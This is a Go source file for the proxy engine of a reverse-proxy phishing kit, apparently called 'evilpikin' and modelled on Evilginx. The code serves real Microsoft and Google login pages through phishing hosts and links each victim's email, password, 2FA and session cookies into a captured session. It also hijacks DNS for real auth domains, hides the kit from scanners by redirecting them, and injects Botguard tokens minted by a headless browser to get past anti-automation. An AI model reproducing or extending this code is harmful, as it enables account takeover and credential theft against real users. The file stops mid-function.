package proxy

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/user/evilpikin/internal/config"
	"github.com/user/evilpikin/internal/core"
	"github.com/user/evilpikin/internal/firewall"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/internal/puppet"
	"github.com/user/evilpikin/internal/storage"
	"golang.org/x/net/publicsuffix"
	"github.com/user/evilpikin/internal/telemetry"
	pxr "github.com/user/evilpikin/pkg/proxy"
	"github.com/user/evilpikin/pkg/lures"
)

// upstreamResolver resolves REAL origins via an out-of-band DNS server, NOT the
// host's local resolver. This is critical: the engine installs /etc/resolver
// entries that point *.ms.test AND the intercepted real Microsoft auth domains
// (login.microsoftonline.com, login.live.com, ...) at 127.0.0.1 so the VICTIM's
// browser is captured. If the engine used that same resolver for its own
// upstream fetches it would resolve its targets to 127.0.0.1 and connect to
// ITSELF (-> bad gateway / proxy loops). Querying a public resolver directly
// keeps the engine egressing to the genuine internet origin.
var upstreamResolver = newExternalResolver("1.1.1.1:53")

// upstreamProxyURL, when set, routes REAL origin egress through an upstream
// HTTP/HTTPS proxy (CORP/locked-down labs where direct egress to the Microsoft
// CDN CNAME is blocked). Nil means egress directly. Set via SetUpstreamProxy.
var upstreamProxyURL *url.URL

// SetUpstreamProxy configures an optional upstream proxy for real-origin egress.
// Pass "" to clear it (direct egress). When set, HTTP/2 is disabled because
// h2-over-CONNECT is unreliable through many corporate proxies.
func SetUpstreamProxy(rawURL string) error {
	if rawURL == "" {
		upstreamProxyURL = nil
		upstreamTransportImpl.ForceAttemptHTTP2 = true
		return nil
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return err
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("egress proxy must be http:// or https:// (got %q)", rawURL)
	}
	upstreamProxyURL = u
	upstreamTransportImpl.ForceAttemptHTTP2 = false
	return nil
}

// publicResolvers are well-known Do53 resolvers raced in parallel with the
// primary upstream resolver so the proxy can still reach real origins (e.g. the
// Microsoft CDN, whose CNAME chain the operator's system resolver may not
// follow) even when the primary resolver is unreachable or blocked by the lab
// network. This directly addresses "the login page loads but the CDN assets
// (SPA/logos) return 502" — typically a CDN-only DNS egress failure.
var publicResolvers = []*net.Resolver{
	newExternalResolver("8.8.8.8:53"),
	newExternalResolver("9.9.9.9:53"),
}

// allUpstreamResolvers returns every resolver to race when resolving a real
// origin: the operator-configured primary, the public fallbacks, and finally
// the host system resolver (unless it is already the primary).
func allUpstreamResolvers() []*net.Resolver {
	res := []*net.Resolver{upstreamResolver}
	res = append(res, publicResolvers...)
	if upstreamResolver != net.DefaultResolver {
		res = append(res, net.DefaultResolver)
	}
	return res
}

func newExternalResolver(addr string) *net.Resolver {
	// Empty / "system" -> use the host's own resolver. This is the RIGHT choice
	// for local/operator machines that have no /etc/resolver intercept loop.
	// On a VPS where /etc/resolver points the phished domains (and even the
	// real Microsoft origins) at 127.0.0.1, the engine must use an out-of-band
	// server (e.g. 1.1.1.1:53) or it would resolve its own upstream to itself.
	if addr == "" || addr == "system" {
		return net.DefaultResolver
	}
	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, _ string) (net.Conn, error) {
			dctx, cancel := context.WithTimeout(ctx, 3*time.Second)
			defer cancel()
			d := net.Dialer{Timeout: 3 * time.Second}
			return d.DialContext(dctx, "udp", addr)
		},
	}
}

// SetUpstreamDNS overrides the resolver the engine uses to reach real origins.
// Pass "" / "system" to use the host resolver, or an explicit "host:port" for
// an out-of-band server (needed when /etc/resolver loops the real origins).
func SetUpstreamDNS(addr string) {
	upstreamResolver = newExternalResolver(addr)
}

// isV4 reports whether ip is an IPv4 address.
func isV4(ip net.IPAddr) bool {
	return ip.IP.To4() != nil
}

// dnsCache caches resolved (non-loopback) origin IPs so the proxy does not
// re-resolve on every one of the dozens of sub-resource requests a modern SPA
// login page fires. Without it, each request paid a full resolveAll (bounded by
// the 8s cap); a Google sign-in page (≈20-40 cross-host assets) then took
// minutes to load. TTL is short so DNS changes still propagate.
var dnsCache sync.Map // host(lower) -> dnsCacheEntry

type dnsCacheEntry struct {
	ips []net.IPAddr
	exp time.Time
}

// resolveAll resolves the REAL origin host. A locked-down lab's system resolver
// often answers with a dead/blackhole IP for blocked hosts (e.g. the Microsoft
// CDN → akamaiedge.net) and, being local+fast, would win a naive first-success
// race and sink the request — discarding a reachable IP that 1.1.1.1 / 8.8.8.8
// returned. So we resolve in TWO phases:
//
//  1. Race the OUT-OF-BAND resolvers (1.1.1.1 + public fallbacks) with a short
//     cap. Merge their usable (non-loopback) IPs; upstreamDialContext then races
//     the connections and uses the first that actually connects. The system
//     resolver is NOT consulted in this phase, so its blackhole IP can't win.
//  2. Only if every out-of-band resolver fails do we fall back to the system
//     resolver. This also avoids the old 8s stall: an unreachable out-of-band
//     resolver is capped at the short phase-1 timeout, not the full 8s.
//
// Results are cached for 60s so repeated sub-resource fetches reuse the answer.
func resolveAll(ctx context.Context, host string) ([]net.IPAddr, error) {
	if v, ok := dnsCache.Load(host); ok {
		if e, ok2 := v.(dnsCacheEntry); ok2 && time.Now().Before(e.exp) {
			return e.ips, nil
		}
		dnsCache.Delete(host)
	}
	all := allUpstreamResolvers()
	var ext, sys []*net.Resolver
	for _, r := range all {
		if r == net.DefaultResolver {
			sys = append(sys, r)
		} else {
			ext = append(ext, r)
		}
	}
	// Operator set --upstream-dns system: there is no separate out-of-band
	// resolver, so treat the system resolver as the primary and skip the fallback.
	if len(ext) == 0 {
		ext = sys
		sys = nil
	}
	if ips, err := raceResolvers(ctx, ext, host, 3*time.Second); err == nil && len(ips) > 0 {
		dnsCache.Store(host, dnsCacheEntry{ips: ips, exp: time.Now().Add(60 * time.Second)})
		return ips, nil
	}
	if len(sys) > 0 {
		if ips, err := raceResolvers(ctx, sys, host, 5*time.Second); err == nil && len(ips) > 0 {
			dnsCache.Store(host, dnsCacheEntry{ips: ips, exp: time.Now().Add(60 * time.Second)})
			return ips, nil
		}
	}
	return nil, fmt.Errorf("no non-loopback addresses for %s", host)
}

// raceResolvers looks up host on every resolver in rs in parallel, MERGING the
// usable (non-loopback) IPs (deduped) and returning them. The first resolver to
// error does not abort the others; we want the union of every reachable IP so
// upstreamDialContext can race the connections. Capped by timeout.
func raceResolvers(ctx context.Context, rs []*net.Resolver, host string, timeout time.Duration) ([]net.IPAddr, error) {
	if len(rs) == 0 {
		return nil, fmt.Errorf("no resolvers for %s", host)
	}
	rctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	type res struct {
		ips []net.IPAddr
		err error
	}
	ch := make(chan res, len(rs))
	for _, r := range rs {
		go func(r *net.Resolver) {
			ips, e := r.LookupIPAddr(rctx, host)
			if e == nil {
				var clean []net.IPAddr
				for _, ip := range ips {
					if !ip.IP.IsLoopback() {
						clean = append(clean, ip)
					}
				}
				if len(clean) == 0 {
					e = fmt.Errorf("only loopback addresses for %s", host)
				}
				ips = clean
			}
			ch <- res{ips, e}
		}(r)
	}
	var merged []net.IPAddr
	seen := map[string]bool{}
	var lastErr error
	for range rs {
		rsp := <-ch
		if rsp.err != nil {
			lastErr = rsp.err
			continue
		}
		for _, ip := range rsp.ips {
			k := ip.IP.String()
			if !seen[k] {
				seen[k] = true
				merged = append(merged, ip)
			}
		}
	}
	if len(merged) > 0 {
		return merged, nil
	}
	return nil, lastErr
}

// upstreamDialContext resolves and connects to the REAL origin. It prefers
// IPv4 and RACES every resolved address in parallel so a single unreachable
// IP (e.g. dead IPv6) can't stall the whole request. The first successful
// connection wins; a 6s cap bounds the worst case. This kills stalls against
// Microsoft's large anycast IP sets.
func upstreamDialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return nil, err
	}
	if net.ParseIP(host) != nil {
		d := &net.Dialer{Timeout: 6 * time.Second, KeepAlive: 30 * time.Second}
		return d.DialContext(ctx, network, addr)
	}
	ips, err := resolveAll(ctx, host)
	if err != nil {
		return nil, err
	}
	sort.SliceStable(ips, func(i, j int) bool {
		return isV4(ips[i]) && !isV4(ips[j])
	})
	type result struct {
		conn net.Conn
		err  error
	}
	ch := make(chan result, len(ips))
	rctx, cancel := context.WithCancel(ctx)
	defer cancel()
	d := &net.Dialer{Timeout: 6 * time.Second, KeepAlive: 30 * time.Second}
	for _, ip := range ips {
		go func(ip net.IPAddr) {
			c, e := d.DialContext(rctx, network, net.JoinHostPort(ip.IP.String(), port))
			ch <- result{c, e}
		}(ip)
	}
	var lastErr error
	for range ips {
		r := <-ch
		if r.err == nil {
			return r.conn, nil
		}
		lastErr = r.err
	}
	if len(ips) == 0 {
		log.Error("proxy engine: upstream %s: resolve returned no usable IPs", host)
	} else {
		addrs := make([]string, len(ips))
		for i, ip := range ips {
			addrs[i] = net.JoinHostPort(ip.IP.String(), port)
		}
		log.Error("proxy engine: upstream %s: dial failed for %v: %v", host, addrs, lastErr)
	}
	return nil, lastErr
}

var upstreamTransportImpl = &http.Transport{
	DialContext:           upstreamDialContext,
	TLSHandshakeTimeout:   10 * time.Second,
	ResponseHeaderTimeout: 20 * time.Second,
	IdleConnTimeout:       90 * time.Second,
	ExpectContinueTimeout: 1 * time.Second,
	ForceAttemptHTTP2:     true,
	// Optional upstream proxy for real-origin egress (nil = direct). Set via
	// SetUpstreamProxy; used in locked-down labs whose only internet path is a
	// corporate proxy. This intentionally replaces ProxyFromEnvironment so the
	// operator controls egress explicitly rather than inheriting a broken env
	// proxy that triggers CDN resets.
	Proxy: func(req *http.Request) (*url.URL, error) {
		if upstreamProxyURL != nil {
			return upstreamProxyURL, nil
		}
		return nil, nil
	},
	TLSClientConfig: &tls.Config{
		// ServerName left empty so Go derives it per-dial from the origin host,
		// keeping a single shared transport correct for every upstream.
		NextProtos: []string{"h2", "http/1.1"},
	},
}

// upstreamTransport is the RoundTripper actually used by the reverse proxy; it
// aliases the concrete *http.Transport above so fields (ForceAttemptHTTP2,
// Proxy) can be toggled at runtime by SetUpstreamProxy.
var upstreamTransport http.RoundTripper = upstreamTransportImpl

type Engine struct {
	targets      map[string]*storage.TargetProfile
	sessions     *core.SessionStore
	store        *storage.Store
	cookieJar    *CookieJar
	fence        *firewall.GeoFence
	telemetryHub *telemetry.Hub
	// sessionBySID correlates a victim's entire lifecycle (email -> password ->
	// 2FA -> cookies, and the standard vs password-reset deviation) into ONE
	// CapturedSession. The SID is the stable __ep_sid cookie the CookieJar
	// issues, so every request the victim makes in a flow maps to the same row.
	sessionMu    sync.Mutex
	sessionBySID map[string]string // sid -> session ID
	// hostRoutes maps a phishing hostname (lower-cased) to the route that serves
	// it: the target clone, its real upstream origin, the upstream port, and the
	// full set of rewrite pairs for the whole auth chain (so cross-host links in
	// the response stay on the proxy).
	hostRoutes map[string]*hostRoute
	// globalAlias is the engine-wide real-origin -> phishing-origin map across
	// ALL loaded targets, used by the postMessage origin shim so any served frame
	// can rewrite a sibling target's origin (not just its own). Guarded by aliasMu.
	globalAlias map[string]string
	aliasMu     sync.RWMutex
	// defaultResolver lets the control plane dynamically serve an unregistered
	// host (e.g. any *.baseDomain) by deriving a target on the fly, so operators
	// don't have to pre-list every phishing host.
	defaultResolver func(sni string) (*storage.TargetProfile, bool)
	// TLSPort is the public HTTPS listen port. When it isn't the standard 443
	// (e.g. 9443 in dev), rewritten URLs must include it so browsers don't fall
	// back to port 443 and escape the proxy.
	TLSPort int
	// SiteDomain is the phishing base domain (e.g. evilpikin.test). Session
	// cookies are scoped to it (TLD+1 style) so a session survives cross-host
	// hops through the auth chain.
	SiteDomain string
	// transformer is the active response rewriter. It is always a
	// StaticTransformer today; a future AI-backed transformer can be swapped in
	// here without touching the proxy hot path, provided it never blocks.
	transformer ResponseTransformer
	// rulesCache backs the transformer's "cached template" optimization.
	rulesCache *RulesCache
	// aiConfig holds the pluggable LLM settings. It is inert unless an
	// AI-backed transformer is registered; the static path is always the
	// fail-safe fallback.
	aiConfig *config.AIConfig
	// proxyToUpstream / upstreamToProxy are the bidirectional routing indexes
	// built from the target's routing_matrix on activation. proxyToUpstream is
	// consulted by the Director to send a request to the right origin;
	// upstreamToProxy drives the response rewriter so HTML/JS links to the real
	// CDN stay on the phishing subdomains.
	proxyToUpstream *sync.Map
	upstreamToProxy *sync.Map
	// dynamicAliases maps a phishing alias (e.g. "cdn.x.com.ms.test") back to its
	// real origin host. It is populated lazily by the response rewriter whenever
	// an HTML page references an external host that no routing_matrix entry
	// covers, so operators don't have to pre-list every CDN/subdomain in the
	// target config. The inbound side derives the origin from the alias suffix
	// directly, so registration is only a fast-path optimization.
	dynamicAliases *sync.Map
	// BaseDomain is the phishing base domain (mirrors SiteDomain). External
	// hosts referenced in a page are dynamically aliased as <host>.<BaseDomain>.
	BaseDomain string
	// InterceptDomains are real domain suffixes the proxy transparently
	// intercepts (serves the real hostname, routing it to itself). This is the
	// "strongest wildcard": any Microsoft auth host the target introduces
	// (password reset, account recovery, MSA) is proxied without pre-listing,
	// keeping the victim in-proxy even when a validated callback URI (wreply,
	// redirect_uri) points at a real Microsoft host.
	InterceptDomains []string

	// Lures, when set, enables the tracking-matrix guard: a request carrying a
	// valid lure token is bound to an EP_SESS session; with RequireLure enabled,
	// any request lacking a token AND a session cookie is bounced to a benign
	// page (scanner/crawler evasion). Nil disables the guard entirely.
	Lures *lures.Registry
	// RequireLure forces every request through a valid lure.
	RequireLure bool
	// ScannerShield withholds the live kit from crawlers/scanners/headless
	// automation by serving a benign decoy; a real victim's browser passes.
	ScannerShield bool
	// SafeRedirectURL is the benign sink for unauthorized crawlers (default google).
	SafeRedirectURL string
	// LureParam is the query parameter carrying the lure token (default "id").
	LureParam string

	// Puppet is the optional EvilPuppet solver. When set and a target declares an
	// evilpuppet block, the engine mints domain-bound challenge tokens on the
	// real origin (via a headless browser) and replays them into the victim's
	// proxied request to defeat client-side anti-automation (Google Botguard).
	Puppet puppet.Solver
	// puppetMu guards puppetCache.
	puppetMu sync.Mutex
	// puppetCache memoizes solved tokens per victim identifier (email) so the
	// expensive browser solve runs once per identity, not per request.
	puppetCache map[string]*puppet.Token

	// runtimeReg is an OPTIONAL bidirectional compound-index registry. When set,
	// the engine links every validated (host <-> token) hit into the shared
	// RuntimeRegistry so a multi-target / multi-lure instance can correlate
	// traffic without relying solely on this engine's per-host maps. Nil =>
	// no external registry (single-tenant behaviour unchanged).
	runtimeReg *pxr.RuntimeRegistry
}

// hostRoute is the per-phishing-host serving record.
type hostRoute struct {
	target *storage.TargetProfile
	orig   string
	port   int
	pairs  []DomainPair
}

// proxyHostURL returns the proxy host with the public TLS port appended when it
// is non-standard, so rewritten URLs keep the browser on the listening port.
func (e *Engine) proxyHostURL(ph string) string {
	if e == nil || e.TLSPort == 0 || e.TLSPort == 443 {
		return ph
	}
	return net.JoinHostPort(ph, strconv.Itoa(e.TLSPort))
}

func proxyPortString(port int) string {
	if port == 0 || port == 443 {
		return ""
	}
	return strconv.Itoa(port)
}

func NewEngine() *Engine {
	rc := NewRulesCache()
	return &Engine{
		targets:    make(map[string]*storage.TargetProfile),
		hostRoutes: make(map[string]*hostRoute),
		sessions:   core.NewSessionStore(),
		cookieJar:  NewCookieJar(""),
		rulesCache: rc,
		// Default to the pure-Go static transformer. The AI layer (future) plugs
		// in here via SetTransformer; until then the fast path is always used.
		transformer:     NewStaticTransformer(rc),
		proxyToUpstream: &sync.Map{},
		upstreamToProxy: &sync.Map{},
		dynamicAliases:  &sync.Map{},
		sessionBySID:   make(map[string]string),
	}
}

// SetTransformer swaps the active response transformer (e.g. to an AI-backed
// implementation in the future). It must be called before the data plane serves
// traffic. The transformer must never block on external services.
func (e *Engine) SetTransformer(t ResponseTransformer) {
	if t == nil {
		return
	}
	e.transformer = t
}

// SetAIConfig records the pluggable LLM settings. The AI layer is not wired into
// the hot path yet; until an AI-backed ResponseTransformer is registered, the
// engine keeps the StaticTransformer as the fail-safe fallback, so traffic is
// never blocked or broken by a missing key / disabled provider.
func (e *Engine) SetAIConfig(c *config.AIConfig) {
	e.aiConfig = c
}

// SetLures attaches the shared lure registry to the live engine. When non-nil,
// every served request passes through the tracking-matrix guard.
func (e *Engine) SetLures(r *lures.Registry) {
	e.Lures = r
}

// SetRequireLure toggles scanner-evasion mode on the live engine.
func (e *Engine) SetRequireLure(v bool) {
	e.RequireLure = v
}

// SetRuntimeRegistry attaches a shared multi-tenant RuntimeRegistry so this
// engine's validated lure hits are recorded into the global (host <-> token)
// compound index. Safe to call before serving; passing nil disables the link.
func (e *Engine) SetRuntimeRegistry(r *pxr.RuntimeRegistry) { e.runtimeReg = r }

// lureGuard wraps a target handler with the tracking-matrix logic. It mirrors
// Evilginx: the phishing host serves the REAL origin page to ANY visitor — the
// lure token only attributes the session, it does NOT gate page delivery. The
// deceptive serve path is rewritten to the target's real landing path by PATH
// match (token-independent), so /login-reset always proxies to the genuine
// login route instead of 404'ing on the origin.
func (e *Engine) lureGuard(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if e.Lures == nil {
			next.ServeHTTP(w, r)
			return
		}
		param := lures.ParamName(e.LureParam)
		token := r.URL.Query().Get(param)
		active, _ := e.Lures.Validate(token)            // for session binding (attribution)
		lurePath, _ := e.Lures.LookupByPath(r.URL.Path) // for deceptive->real path rewrite

		// Compound-index telemetry: feed the validated (host <-> token) pair into
		// the shared multi-tenant registry so concurrent campaigns stay correlated
		// without this engine's own per-host maps. Nil-safe: no-op in single-tenant.
		if active != nil && e.runtimeReg != nil {
			e.runtimeReg.LinkHostToken(r.Host, active.ID)
			e.runtimeReg.AddHit(active.ID)
		}

		if token != "" && active == nil {
			log.Debug("lure guard: token %q invalid for path %q (page still served via path match)", token, r.URL.Path)
		}

		// Scanner evasion (optional): only valid-token or known-session visitors
		// get the page; everyone else is bounced to a benign sink. Disabled by
		// default so the page is openly reachable like a real phishing site.
		if e.RequireLure && active == nil && !lures.HasSessionCookie(r) {
			lures.SafeRedirect(w, r, e.SafeRedirectURL)
			return
		}

		if active != nil {
			tok := lures.SetSessionCookie(w, r, e.SiteDomain)
			e.Lures.BindSession(tok, active.ID, active.TargetProfile, lures.ClientIP(r), r.UserAgent())
		}

		// Token-independent path rewrite: serve the genuine origin page for the
		// phishing path. Without this, /login-reset hits the origin verbatim and
		// 404s -> blank page.
		if lurePath != nil {
			landing := lurePath.LandingPath
			if landing == "" {
				if t, ok := e.TargetFor(lurePath.TargetProfile); ok {
					landing = t.RedirectURL
				}
			}
			if landing != "" {
				if strings.HasPrefix(landing, "/") {
					r.URL.Path = landing
				} else if u, err := url.Parse(landing); err == nil && u.Path != "" {
					r.URL.Path = u.Path
					if u.RawQuery != "" {
						q := r.URL.Query()
						for k, vs := range u.Query() {
							for _, v := range vs {
								q.Add(k, v)
							}
						}
						r.URL.RawQuery = q.Encode()
					}
				}
				r.URL.RawPath = ""
			}
			if token != "" {
				lures.StripParam(r, param)
			}
		}

		next.ServeHTTP(w, r)
	})
}

// SetPuppet attaches the EvilPuppet solver (headless-browser challenge solver).
func (e *Engine) SetPuppet(s puppet.Solver) {
	e.Puppet = s
}

// puppetGuard replays domain-bound challenge tokens into the victim's proxied
// request. When a target declares an evilpuppet rule whose trigger path matches
// and the request lacks the token, the engine asks the solver to mint a valid
// token on the GENUINE origin (the victim's own browser cannot, because the
// token is bound to window.location.hostname) and injects it before forwarding.
func (e *Engine) puppetGuard(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if e.Puppet == nil {
			next.ServeHTTP(w, r)
			return
		}
		t, ok := e.TargetFor(r.Host)
		if !ok || t.EvilPuppet == nil || !t.EvilPuppet.Enabled {
			next.ServeHTTP(w, r)
			return
		}
		var rule *storage.EvilPuppetRule
		for i := range t.EvilPuppet.Rules {
			rp := &t.EvilPuppet.Rules[i]
			if strings.HasPrefix(r.URL.Path, rp.Path) {
				rule = rp
				break
			}
		}
		if rule == nil {
			next.ServeHTTP(w, r)
			return
		}
		// Mint/replay a valid Botguard token and patch it into the victim's
		// request. The victim's own browser produced an INVALID token (bound to
		// the phishing hostname), so we always replace it with one minted on the
		// genuine origin. The solver result is cached per identity, so this is a
		// cheap replay after the first solve.
		//
		// NOTE: a headless solver's token is itself session/browser-bound and is
		// rejected by Google ("v3/signin/rejected"). When EVILPUPPET_DISABLE_INJECT=1
		// is set we SKIP injection and trust the victim-side origin shim (see
		// transform.go) to have the victim's own real browser mint a genuine-origin
		// token instead. This is the correct path for a human victim.
		if os.Getenv("EVILPUPPET_DISABLE_INJECT") == "1" {
			next.ServeHTTP(w, r)
			return
		}
		email := firstQueryOrForm(r, rule.Field, "identifier", "email", "Email")
		if email == "" {
			next.ServeHTTP(w, r)
			return
		}
		tok := e.puppetToken(r, t, rule, email)
		if tok != nil {
			param := tok.Param
			if param == "" {
				param = rule.TokenParam
			}
			injectTokenIntoRequest(r, param, tok.Value)
			log.Info("evilpuppet: injected %s token for %s", param, email)
		}
		next.ServeHTTP(w, r)
	})
}

// puppetToken returns a cached or freshly-solved challenge token for an identity.
func (e *Engine) puppetToken(r *http.Request, t *storage.TargetProfile, rule *storage.EvilPuppetRule, email string) *puppet.Token {
	e.puppetMu.Lock()
	if e.puppetCache == nil {
		e.puppetCache = make(map[string]*puppet.Token)
	}
	if cached, ok := e.puppetCache[email]; ok {
		e.puppetMu.Unlock()
		return cached
	}
	e.puppetMu.Unlock()

	tok, err := e.Puppet.SolveToken(r.Context(), puppet.SolveRequest{
		RealOrigin: t.EvilPuppet.SolveURL,
		RealPath:   rule.RealPath,
		Field:      rule.Field,
		Value:      email,
		TokenParam: rule.TokenParam,
	})
	if err != nil {
		log.Error("evilpuppet: solve %s: %v", rule.TokenParam, err)
		return nil
	}
	e.puppetMu.Lock()
	e.puppetCache[email] = tok
	e.puppetMu.Unlock()
	return tok
}

// firstQueryOrForm returns the first non-empty value for keys from the URL query
// (GET) then the parsed form (POST). Used to recover the victim identifier that
// triggers a challenge token generation.
func firstQueryOrForm(r *http.Request, keys ...string) string {
	q := r.URL.Query()
	for _, k := range keys {
		if v := q.Get(k); v != "" {
			return v
		}
	}
	if r.Method == http.MethodPost {
		if err := r.ParseForm(); err == nil {
			for _, k := range keys {
				if v := r.FormValue(k); v != "" {
					return v
				}
			}
		}
	}
	return ""
}

// injectTokenIntoRequest patches a Botguard token into the request. For GET it
// sets the query param; for an urlencoded POST (Google v3 carries the token in
// the request body) it rewrites the body and updates Content-Length, replacing
// any invalid token the victim's browser produced on the phishing origin. When
// the body was already consumed by form parsing upstream, the parsed form
// (r.PostForm) is used so original fields are preserved.
func injectTokenIntoRequest(r *http.Request, param, value string) {
	if r.Method == http.MethodPost && strings.Contains(r.Header.Get("Content-Type"), "application/x-www-form-urlencoded") {
		form := r.PostForm
		if form == nil {
			if b, err := io.ReadAll(r.Body); err == nil {
				r.Body.Close()
				form, _ = url.ParseQuery(string(b))
			}
		}
		if form == nil {
			form = url.Values{}
		}
		form.Set(param, value)
		newBody := form.Encode()
		r.Body = io.NopCloser(strings.NewReader(newBody))
		r.ContentLength = int64(len(newBody))
		r.Header.Set("Content-Length", strconv.Itoa(len(newBody)))
		return
	}
	q := r.URL.Query()
	q.Set(param, value)
	r.URL.RawQuery = q.Encode()
}

func (e *Engine) SetGeoFence(f *firewall.GeoFence) {
	e.fence = f
}

func (e *Engine) SetTelemetry(h *telemetry.Hub) {
	e.telemetryHub = h
}

func (e *Engine) SetStore(s *storage.Store) {
	e.store = s
}

// SetSiteDomain sets the phishing base domain, propagates it to the cookie jar
// for TLD+1 session scoping, and re-registers all enabled targets so their
// proxy-host routes reflect the new domain.
func (e *Engine) SetSiteDomain(d string) {
	e.SiteDomain = d
	e.BaseDomain = d
	if e.cookieJar != nil {
		e.cookieJar.SiteDomain = d
	}
	if e.store != nil {
		if ts, err := e.store.ListTargets(); err == nil {
			e.hostRoutes = make(map[string]*hostRoute)
			e.targets = make(map[string]*storage.TargetProfile)
			for _, t := range ts {
				if t.Enabled {
					e.UpsertTarget(t)
				}
			}
		}
	}
}

// SetInterceptDomains configures the real domain suffixes the proxy transparently
// intercepts (serves the real hostname, routing it to itself). See Engine.InterceptDomains.
func (e *Engine) SetInterceptDomains(domains []string) {
	e.InterceptDomains = domains
}

// buildChainPairs returns the rewrite pairs for the WHOLE auth chain of a
// target, derived SOLELY from that target's own resolved proxy hosts. Pairs are
// intentionally NOT pulled from any engine-global index: mixing pairs from
// other loaded targets would rewrite one target's responses with another's host
// map (and surface malformed phish hosts). Each target's chain is self-contained
// via its routing_matrix / proxy_hosts / origins.
func buildChainPairs(e *Engine, t *storage.TargetProfile) []DomainPair {
	out := make([]DomainPair, 0)
	for _, r := range t.ResolvedProxyHosts(e.SiteDomain) {
		if r.OrigHost != "" && r.PhishHost != "" {
			out = append(out, DomainPair{ProxyHost: r.PhishHost, Origin: r.OrigHost})
		}
	}
	// legacy origins list, if present and not already covered
	for _, o := range t.Origins {
		if o != "" {
			out = append(out, DomainPair{ProxyHost: t.ProxyHost, Origin: o})
		}
	}
	return out
}

// UpsertTarget registers every phishing host of the target as a serving route.
// The route carries the real upstream origin/port and the full-chain rewrite
// pairs, so the engine serves and rewrites the entire auth chain, not just one
// host.
func (e *Engine) UpsertTarget(t *storage.TargetProfile) {
	if t == nil {
		return
	}
	t.Normalize()
	routes := t.ResolvedProxyHosts(e.SiteDomain)
	pairs := buildChainPairs(e, t)
	for _, r := range routes {
		clone := *t
		clone.ProxyHost = r.PhishHost
		clone.Origin = r.OrigHost
		clone.ForceHTTPS = r.Port == 443
		e.hostRoutes[strings.ToLower(r.PhishHost)] = &hostRoute{target: &clone, orig: r.OrigHost, port: r.Port, pairs: pairs}
		e.targets[strings.ToLower(r.PhishHost)] = &clone
		// Maintain the bidirectional routing indexes (the explicit structured
		// matrix) for Director + response rewriter lookups.
		e.proxyToUpstream.Store(strings.ToLower(r.PhishHost), r.OrigHost)
		e.upstreamToProxy.Store(r.OrigHost, r.PhishHost)
	}
	e.buildGlobalAlias()
}

func (e *Engine) RemoveTarget(proxyHost string) {
	delete(e.hostRoutes, strings.ToLower(proxyHost))
	delete(e.targets, strings.ToLower(proxyHost))
	e.buildGlobalAlias()
}

// buildGlobalAlias recomputes the engine-wide real-origin -> phishing-origin map
// from every registered route. It is called whenever targets are added/removed.
// The map is injected into every served frame's postMessage shim so a frame can
// rewrite postMessage target origins pointing at ANY phishing twin, not only its
// own — necessary because Google's SPA cross-posts between sibling frames (e.g.
// the youtube CheckConnection frame posts to https://accounts.google.com).
func (e *Engine) buildGlobalAlias() {
	m := make(map[string]string)
	port := proxyPortString(e.TLSPort)
	for phish, hr := range e.hostRoutes {
		if hr.orig == "" || phish == "" {
			continue
		}
		key := "https://" + strings.ToLower(hr.orig)
		val := "https://" + phish
		if port != "" && port != "443" {
			val = val + ":" + port
		}
		m[key] = val
	}
	e.aliasMu.Lock()
	e.globalAlias = m
	e.aliasMu.Unlock()
}

// GlobalAlias returns the current engine-wide real->phish origin map (read-only).
func (e *Engine) GlobalAlias() map[string]string {
	e.aliasMu.RLock()
	defer e.aliasMu.RUnlock()
	return e.globalAlias
}

func (e *Engine) targetFor(host string) (*hostRoute, bool) {
	r, ok := e.hostRoutes[strings.ToLower(host)]
	return r, ok
}

// TargetFor returns the cached target profile for a host (after resolution),
// or false if none is registered. Exported for introspection/tests.
func (e *Engine) TargetFor(host string) (*storage.TargetProfile, bool) {
	r, ok := e.targetFor(host)
	if !ok {
		return nil, false
	}
	return r.target, true
}

// dynamicAliasFor returns the phishing alias for an arbitrary external origin
// host (<origin>.<BaseDomain>) and records it in the dynamic registry so the
// inbound side can resolve it without a pre-listed routing_matrix entry. It
// returns the origin unchanged when it is already a phishing alias or no base
// domain is configured.
func (e *Engine) dynamicAliasFor(origin string) (string, bool) {
	origin = strings.ToLower(strings.TrimSpace(origin))
	if e.BaseDomain == "" || origin == "" {
		return "", false
	}
	if strings.HasSuffix(origin, "."+e.BaseDomain) {
		return origin, true
	}
	// Already one of our phishing hosts (possibly on a foreign suffix, e.g.
	// google.test): do not mint a <host>.<BaseDomain> alias — the browser
	// will fetch the phish host directly and the host route serves it. The
	// inbound side would otherwise resolve <host>.<BaseDomain> back to this
	// unresolvable host ("no non-loopback addresses" → 502 Bad Gateway).
	if _, ok := e.targetFor(origin); ok {
		return origin, true
	}
	alias := origin + "." + e.BaseDomain
	e.dynamicAliases.Store(alias, origin)
	return alias, true
}

// cookieScopeForTarget computes the cookie scope domain for a target: the
// configured base domain when the target lives under it, else the target's own
// registrable suffix (foreign-suffix phishlets, e.g. google.test).
func cookieScopeForTarget(base string, target *storage.TargetProfile) string {
	base = strings.ToLower(base)
	if target == nil {
		return base
	}
	ph := strings.ToLower(target.ProxyHost)
	if base == "" {
		return target.ProxyHost // legacy
	}
	if ph == base || strings.HasSuffix(ph, "."+base) {
		return base
	}
	if apex, err := publicsuffix.EffectiveTLDPlusOne(ph); err == nil {
		return apex // e.g. "google.test"
	}
	return ph
}

// siteDomainFor returns the cookie scope domain for a target: the phishing site
// domain when set (so sessions survive cross-host hops), else the target's own
// phishing host. For a target on a foreign suffix (e.g. google.test) that does
// NOT live under the configured base domain, the base domain must NOT be used:
// cookies Domain=.ms.test are cross-site for the google.test origin and the
// browser drops them, which severs the auth chain. Foreign-suffix targets are
// scoped to their own registrable suffix instead.
func (e *Engine) siteDomainFor(target *storage.TargetProfile) string {
